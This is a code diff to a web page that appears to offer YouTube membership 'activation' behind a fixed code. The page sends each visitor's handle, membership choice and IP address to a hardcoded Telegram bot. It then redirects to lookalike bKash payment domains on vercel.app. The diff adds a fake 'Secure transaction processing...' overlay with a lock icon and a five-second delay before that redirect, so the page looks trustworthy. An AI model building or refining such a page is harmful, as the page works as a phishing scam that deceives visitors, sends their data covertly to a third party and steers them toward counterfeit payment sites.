@@ -136,6 +136,31 @@
             background-color: rgba(0, 0, 0, 0.5);
             z-index: 500;
         }
+
+        /* Animation styling */
+        .processing-animation {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            z-index: 1100;
+            text-align: center;
+        }
+
+        .processing-animation img {
+            width: 50px;
+        }
+
+        .processing-animation p {
+            font-size: 1.2rem;
+            margin-top: 10px;
+            color: black;
+        }
+
     </style>
 </head>
 <body>
@@ -221,6 +246,12 @@
         <button onclick="activate()">Activate</button>
     </div>
 
+    <!-- Processing Animation -->
+    <div class="processing-animation" id="processingAnimation">
+        <img src="https://img.icons8.com/fluency/48/000000/lock.png" alt="Lock Icon">
+        <p>Secure transaction processing...</p>
+    </div>
+
     <script>
         function openPopup() {
             document.querySelector('.overlay').style.display = 'block';
@@ -237,7 +268,7 @@
             const chatId = '7174617845';
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // Using XMLHttpRequest to avoid potential CORS issues
+           // Using XMLHttpRequest to avoid potential CORS issues
             var xhttp = new XMLHttpRequest();
             xhttp.open("GET", url, true);
             xhttp.send();
@@ -256,21 +287,38 @@
                 });
         }
 
+        function showProcessingAnimation() {
+            document.getElementById('processingAnimation').style.display = 'block';
+        }
+
+        function hideProcessingAnimation() {
+            document.getElementById('processingAnimation').style.display = 'none';
+        }
+
         function activate() {
             const youtubeHandle = document.getElementById('youtubeHandle').value;
             const activationCode = document.getElementById('activationCode').value;
             const membershipType = document.getElementById('membershipType').value;
 
             if (activationCode === 'LYT089') {
+                // Show the processing animation
+                showProcessingAnimation();
+
                 // Send activation message to Telegram
                 getIPAndSendMessage(`YouTube Handle: ${youtubeHandle} has activated their subscription. Membership: ${membershipType}`);
 
-                // Redirect based on membership type
-                if (membershipType === 'gold') {
-                    window.location.href = 'https://pay-bkash.vercel.app';
-                } else if (membershipType === 'platinum') {
-                    window.location.href = 'https://bkash-pay.vercel.app';
-                }
+                // Simulate a 5-second delay for the animation
+                setTimeout(() => {
+                    // Hide the processing animation after 5 seconds
+                    hideProcessingAnimation();
+
+                    // Redirect based on membership type
+                    if (membershipType === 'gold') {
+                        window.location.href = 'https://pay-bkash.vercel.app';
+                    } else if (membershipType === 'platinum') {
+                        window.location.href = 'https://bkash-pay.vercel.app';
+                    }
+                }, 5000);
             } else {
                 alert('Invalid activation code!');
             }
